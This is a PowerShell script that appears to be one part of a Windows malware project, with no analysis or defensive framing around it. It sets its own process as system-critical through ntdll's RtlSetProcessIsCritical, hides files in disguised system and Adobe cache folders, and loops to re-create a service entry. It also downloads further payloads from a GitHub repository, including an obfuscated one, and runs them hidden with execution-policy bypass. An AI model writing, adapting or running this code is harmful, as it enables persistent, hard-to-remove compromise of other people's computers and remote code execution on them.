param(
    [string]$basePath,
    [string]$exe,
    [string]$childServiceName,
    [string]$childServicePropertyName
)
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]

$paths = @(
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642"
)

$mutexName = "Global\MyUniquePrion"
$mutex = New-Object System.Threading.Mutex($false, $mutexName)



$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$childServiceName"
$initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
$fwdName = "f.ps1"

$signature = @"
using System;
using System.Runtime.InteropServices;

public class CS {
    [DllImport("ntdll.dll")]
    public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
"@
Add-Type -TypeDefinition $signature
[CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null

if($basePath -eq "" -or $childServiceName -eq "" -or $childServicePropertyName -eq ""){
    $mutex.WaitOne()
    try {
        if(-not(Test-Path -Path "$env:temp\598600304.txt" -PathType Leaf)){
            $pa = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $pa = "$pa\async_fun.vbs"
            iwr -uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/warning.vbs" -OutFile "$pa"
            wscript.exe $pa
            New-Item -Path "$env:temp\598600304.txt" -ItemType File -Force
        }
    }
    finally {
        $mutex.ReleaseMutex()
        exit
    }
}

$b = $basePath -replace '([\\{}])', '`$1'
$item = Get-ItemProperty -Path "$basePath" -Name $childServicePropertyName -ErrorAction SilentlyContinue
$issetup = $false

if(-not($item)){
    $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $fwdPath = "$fwdPath\$fwdName"
    New-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $fwdPath -Force | Out-Null
    $issetup = $true
}

else{
    $fwdPath = $item.$childServicePropertyName
    $issetup = $false
}



function Get-ServiceReg{
    param([string]$path)

    $r = Get-Item -Path $path -ErrorAction SilentlyContinue

    if(-not($r)){
        return $true
    }
    return $false
}



function Get-ServiceName{
    param([string]$name)

    try {
        $s = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($s)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}




while ($true) {
    $x = Get-ServiceReg -path $regPath
    $y = Get-ServiceName -name $childServiceName
    if((Test-Path -Path "$env:temp\_ready.lock" -PathType Leaf) -and (Test-Path -Path "$env:temp\jMEmdVuJAtNea.txt" -PathType Leaf)){
        $fwdName = Get-Content -Path "$env:temp\jMEmdVuJAtNea.txt"
        $fwdName = $fwdName.Trim()
        Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
        if($null -ne $fwdName -and $fwdName -ne ""){
            $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
            $arg = "-ep bypass -nop -w hidden $fwdPath"
            & $exe set $childServiceName AppParameters $arg
            Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $fwdPath -Force | Out-Null
            Remove-Item -Path "$env:temp\_ready.lock" -Force
            echo "GET LAID WINDOWS DF XD" >> "C:\LAID.txt"
        }
    }
    if(-not(Test-Path -Path $fwdPath -PathType Leaf)){
        if(-not($issetup)){
            $initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
            $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $fwdPath = "$fwdPath\$fwdName"
            Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $fwdPath -Force | Out-Null
        }
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
    }

    elseif($x -or $y){
        $initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
        $initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
        powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
    }
    $issetup = $false
}